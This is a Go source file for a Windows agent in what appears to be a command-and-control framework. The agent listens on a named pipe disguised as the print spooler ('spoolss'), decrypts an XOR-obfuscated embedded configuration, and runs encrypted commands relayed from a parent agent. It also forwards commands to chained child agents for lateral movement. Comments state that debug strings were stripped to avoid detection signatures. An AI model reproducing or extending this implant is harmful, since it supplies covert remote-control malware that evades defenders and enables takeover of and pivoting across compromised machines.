// server/docker/payloads/SMB_Windows/main.go
// SMB-based Windows agent that communicates via named pipes

//go:build windows
// +build windows

package main

import (
	"encoding/json"
	// "log"
	"os"
	"os/signal"
	"syscall"
	"time"
)

// Configuration variables - will be replaced at compile time via -ldflags
var (
	// XOR key for decrypting embedded values (same pattern as HTTPS agent)
	xorKey = ""

	// Embedded encrypted configuration blob (XOR encrypted with decrypted secret)
	encryptedConfig = ""

	// Initial client ID from build
	clientID = ""

	// Current sleep interval (seconds) and jitter (percentage)
	sleep  = "30"
	jitter = "10"

	// Secret for encryption (XOR encrypted with xorKey, decrypted at runtime)
	secret = ""

	// Pipe name for the named pipe listener
	pipeName = "spoolss"

	// Debug mode
	debugMode = "false"
)

// Global managers
var (
	pipeListener  *PipeListener
	commandQueue  *CommandQueue
	resultManager *ResultManager
	secureComms   *SecureComms
)

func main() {
	// Debug logging removed to eliminate signatures
	// if debugMode == "true" {
	// 	log.SetFlags(log.LstdFlags | log.Lshortfile)
	// 	log.SetPrefix("[SMB Agent] ")
	// } else {
	// 	log.SetOutput(os.Stderr)
	// 	log.SetPrefix("")
	// 	log.SetFlags(0)
	// }

	// logDebug("Starting...")

	// Decrypt embedded configuration
	config, err := decryptConfig(encryptedConfig)
	if err != nil {
		// logDebug("Failed to decrypt config: %v", err)
		os.Exit(1)
	}

	// logDebug("Configuration loaded")

	// Initialize command queue and result manager
	commandQueue = NewCommandQueue()
	resultManager = NewResultManager()

	// Create the named pipe listener using the global pipeName variable
	// (set via ldflags during build, defaults to "spoolss")
	activePipeName := pipeName
	if configPipe, ok := config["Pipe Name"]; ok && configPipe != "" {
		activePipeName = configPipe // Override with config if present
	}

	pipeListener, err = NewPipeListener(activePipeName)
	if err != nil {
		// logDebug("Failed to create pipe listener: %v", err)
		os.Exit(1)
	}

	// logDebug("Listening on pipe: %s", pipeListener.GetPipePath())

	// Handle shutdown gracefully
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		// logDebug("Shutdown signal received")
		pipeListener.Close()
		os.Exit(0)
	}()

	// Main loop - wait for connections from HTTPS agents
	for {
		conn, err := pipeListener.Accept()
		if err != nil {
			// logDebug("Accept error: %v", err)
			time.Sleep(time.Second)
			continue
		}

		// logDebug("New connection from HTTPS agent")

		// Handle connection in a goroutine
		go handleConnection(conn, config)
	}
}

func handleConnection(conn *PipeConnection, config map[string]string) {
	defer func() {
		conn.Close()
		// logDebug("Connection closed")
	}()

	// Perform authentication with the connecting HTTPS agent
	if err := performAuth(conn); err != nil {
		// logDebug("Authentication failed: %v", err)
		return
	}

	// logDebug("Authentication successful")

	// Always perform handshake for each new connection
	// Even if we already have clientID/keys, the connecting HTTPS agent needs
	// to receive our handshake data to complete the link
	if err := performHandshake(conn, config); err != nil {
		// logDebug("Handshake failed: %v", err)
		return
	}
	// logDebug("Handshake complete, clientID=%s", clientID)

	// Main message loop
	// logDebug("Entering main message loop")
	for {
		// Read message from HTTPS agent
		message, err := conn.ReadMessage()
		if err != nil {
			// logDebug("Read error: %v", err)
			return
		}

		// Parse message type
		var msgEnvelope struct {
			Type    string `json:"type"`
			Payload string `json:"payload"`
		}
		if err := json.Unmarshal(message, &msgEnvelope); err != nil {
			// logDebug("Invalid message format: %v", err)
			continue
		}

		switch msgEnvelope.Type {
		case "data":
			handleServerData(conn, msgEnvelope.Payload)

		case "handshake_response":
			handleHandshakeResponse(conn, msgEnvelope.Payload)

		case "disconnect":
			// logDebug("Disconnect requested")
			return

		default:
			// logDebug("Unknown message type: %s", msgEnvelope.Type)
		}
	}
}

func handleServerData(conn *PipeConnection, encryptedPayload string) {
	if secureComms == nil {
		// logDebug("SecureComms not initialized")
		return
	}

	// Decrypt the payload
	decrypted, err := secureComms.DecryptMessage(encryptedPayload)
	if err != nil {
		// logDebug("Failed to decrypt payload: %v", err)
		return
	}

	// Parse as JSON to check for nested link commands
	var payloadData map[string]interface{}
	if err := json.Unmarshal([]byte(decrypted), &payloadData); err != nil {
		// Legacy format - just commands array
		if err := commandQueue.AddCommands(decrypted); err != nil {
			// logDebug("Failed to add commands: %v", err)
			return
		}
	} else {
		// New format - may have commands and/or link data

		// Process handshake responses for child agents FIRST (before commands)
		if linkRespVal, ok := payloadData["lr"]; ok {
			if linkRespData, ok := linkRespVal.([]interface{}); ok {
				processLinkHandshakeResponses(linkRespData)
			}
		}

		// Process link commands for child agents (forward to linked SMB agents)
		if linkCmdsVal, ok := payloadData["lc"]; ok {
			if linkCmdsData, ok := linkCmdsVal.([]interface{}); ok {
				processLinkCommands(linkCmdsData)
			}
		}

		// Extract commands array if present
		if cmdsVal, ok := payloadData["commands"]; ok {
			cmdsJSON, err := json.Marshal(cmdsVal)
			if err == nil {
				commandQueue.AddCommands(string(cmdsJSON))
			}
		}
	}

	// Process commands
	for {
		result, err := commandQueue.ProcessNextCommand()
		if err != nil {
			continue
		}
		if result == nil {
			break
		}

		// Add result to manager
		resultManager.AddResult(result)
	}

	// Collect link data from child SMB agents (if any)
	lm := GetLinkManager()
	linkData := lm.GetOutboundData()
	unlinkNotifications := lm.GetUnlinkNotifications()

	hasResults := resultManager.HasResults()
	hasLinkData := len(linkData) > 0
	hasUnlinkNotifications := len(unlinkNotifications) > 0

	// Send results back (including any link data from child agents)
	if hasResults || hasLinkData || hasUnlinkNotifications {
		results := resultManager.GetPendingResults()

		payload := map[string]interface{}{
			"agent_id": clientID,
		}

		if len(results) > 0 {
			payload["results"] = results
		}

		// Include link data from child agents (to be forwarded up the chain)
		if hasLinkData {
			payload["ld"] = linkData
		}

		// Include unlink notifications from child agents
		if hasUnlinkNotifications {
			payload["lu"] = unlinkNotifications
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			// logDebug("Failed to marshal results: %v", err)
			return
		}

		// Encrypt with our secret
		encrypted, err := secureComms.EncryptMessage(string(jsonData))
		if err != nil {
			// logDebug("Failed to encrypt results: %v", err)
			return
		}

		// Send back through pipe
		response := map[string]string{
			"type":    "data",
			"payload": encrypted,
		}
		respJSON, _ := json.Marshal(response)
		if err := conn.WriteMessage(respJSON); err != nil {
			// logDebug("Failed to send results: %v", err)
		}

		// Rotate secret
		secureComms.RotateSecret()
	} else {
		// Still need to send an empty response so parent knows we're done
		emptyPayload := map[string]interface{}{
			"agent_id": clientID,
		}
		jsonData, _ := json.Marshal(emptyPayload)
		encrypted, err := secureComms.EncryptMessage(string(jsonData))
		if err != nil {
			return
		}
		response := map[string]string{
			"type":    "data",
			"payload": encrypted,
		}
		respJSON, _ := json.Marshal(response)
		conn.WriteMessage(respJSON)
		secureComms.RotateSecret()
	}
}

func handleHandshakeResponse(conn *PipeConnection, payload string) {
	// This is called when we receive a handshake response from the server
	// The actual handling is done in the handshake.go performHandshake flow
	// logDebug("Received handshake response")
}

// logDebug removed to eliminate debug strings from binary
// func logDebug(format string, v ...interface{}) {
// 	if debugMode == "true" {
// 		log.Printf(format, v...)
// 	}
// }

// processLinkCommands forwards commands from parent to linked (child) SMB agents
// and waits for responses synchronously so they can be included in the same response cycle
func processLinkCommands(linkCmds []interface{}) {
	lm := GetLinkManager()

	for _, cmd := range linkCmds {
		cmdMap, ok := cmd.(map[string]interface{})
		if !ok {
			continue
		}

		routingID, _ := cmdMap["r"].(string)
		payload, _ := cmdMap["p"].(string)

		if routingID == "" || payload == "" {
			continue
		}

		// Forward to the linked agent AND WAIT for response
		response, err := lm.ForwardToLinkedAgentAndWait(routingID, payload, 30*time.Second)
		if err != nil {
			continue
		}

		if response != nil {
			// Queue the response for sending back to parent
			lm.queueOutboundData(response)
		}
	}
}

// processLinkHandshakeResponses forwards handshake responses from parent to child SMB agents
func processLinkHandshakeResponses(linkResps []interface{}) {
	lm := GetLinkManager()

	for _, resp := range linkResps {
		respMap, ok := resp.(map[string]interface{})
		if !ok {
			continue
		}

		routingID, _ := respMap["r"].(string)
		payload, _ := respMap["p"].(string)

		if routingID == "" || payload == "" {
			continue
		}

		// Get the link
		link, exists := lm.GetLink(routingID)
		if !exists {
			continue
		}

		// Send handshake response to child SMB agent
		message := map[string]string{
			"type":    "handshake_response",
			"payload": payload,
		}

		msgJSON, err := json.Marshal(message)
		if err != nil {
			continue
		}

		link.mu.Lock()
		writeMessage(link.Conn, msgJSON)
		link.mu.Unlock()
	}
}
